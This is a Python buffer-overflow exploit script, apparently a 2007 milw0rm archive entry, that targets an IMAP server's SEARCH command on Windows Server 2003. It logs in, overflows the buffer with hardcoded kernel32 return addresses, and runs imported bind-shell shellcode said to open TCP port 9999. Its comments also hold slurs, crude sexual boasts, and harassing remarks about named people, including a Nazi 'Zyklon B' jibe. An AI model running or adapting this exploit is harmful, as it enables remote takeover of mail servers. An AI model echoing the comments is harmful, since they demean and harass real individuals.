#!/usr/bin/python

import os
import sys
import time
import socket
import struct
from payload import buf

#this is imap exploit

#710 bytes, tcp port 9999 bind, borrowed from skape miller inventor of megacanvas



def Fascism(target,u,p,port):
	target = target
	safe_readable_null = 0x71c010e4 # Safe readable, preferably null (ws2_32 on win2k3)
	safe_writable = 0x0fff7004 # Safe writable (rsaenh.dll data section on win2k3)
	pop_then_ret = 0x77e41a26 # EIP (pop, ret in kernel32 on win2k3)
	call_esp = 0x77e839b3 # Return #2, call esp in kernel32. When hit, esp points at the next 4 bytes.
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target, port))
	pkt = b"0001 LOGIN \""
	pkt += u
	pkt += b"\" \""
	pkt += p
	pkt += b"\"\r\n"
	s.send(pkt)
	pkt = b"0003 SELECT \"Inbox\"\r\n"
	s.send(pkt)
	pkt = b"C284 SEARCH "
	pkt += b"P"*1008
	pkt += struct.pack(b'<L',safe_readable_null)
	pkt += b"CUNT" # Word used to describe members of the infosec community.
	pkt += struct.pack(b'<L',pop_then_ret)
	pkt += struct.pack(b'<L',safe_writable)
	pkt += struct.pack(b'<L',call_esp)
	pkt += b"A"*198 # I have boned over 198 bitches
	pkt += b"\xeb\x10" # Body Mass Index of Gadi Evron, hexadecimal LOLOLOLOL
	pkt += struct.pack(b'<L',safe_readable_null)
	pkt += b"A"*16 # Unnecessary megathropic nopsled, invented by k2, founding member of n3td3v
	pkt += buf
	pkt += b" (SAVE MIN) SINCE 12-Feb-1992 NOT FROM \"Len Rose The Moderating Nazi of Full Disclosure, Original Founder of Zyklon B\"\r\n"
	
	s.send(pkt)
	time.sleep(3)
	
	s.close()



def shell_attack(target_machine, target_port):
	   
		Fascism(target_machine,b"User",b"Pass",target_port)

# milw0rm.com [2007-08-14]